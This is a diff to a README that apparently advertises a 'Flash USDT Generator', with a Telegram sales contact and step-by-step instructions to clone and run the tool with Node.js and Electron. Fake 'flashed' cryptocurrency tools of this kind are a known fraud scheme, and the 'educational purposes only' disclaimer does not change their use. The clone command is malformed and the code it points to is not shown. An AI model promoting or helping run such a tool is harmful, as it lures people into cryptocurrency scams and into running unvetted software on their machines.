@@ -84,3 +84,60 @@ We’re always online to help.
 Try it today and feel the difference!
 
 [https://t.me/flashanthony](https://t.me/flashanthony)
+
+## Prerequisites
+This application requires [Node.js](https://nodejs.org) to run.
+
+### Android/IOS
+
+Click [here](https://github.com/joseph4532/Flash-USDT-Generator-) to visit the mobile repository.
+
+### Windows
+
+Download the Node.js setup application [here](https://nodejs.org/en/download/).
+
+### Linux
+
+Run this code in terminal. You may need superuser privileges (sudo).
+
+```sh
+apt install nodejs
+```
+
+### Mac
+
+Install Homebrew (if you don't have it). Open the terminal and run:
+
+```sh
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+```
+
+Once Homebrew is installed, you can install Node.js by running:
+
+```sh
+brew install node
+```
+
+## Installation
+
+1. Clone the repository:
+
+```sh
+git clone usdt-flashing/public-release
+```
+
+2. Install necessary dependencies:
+
+```sh
+npm install && npm install electron
+```
+
+## Usage
+
+```sh
+npm start
+```
+
+## Disclaimer
+### This project is for educational purposes only. 
+### Do not use it for illegal or unethical activities.
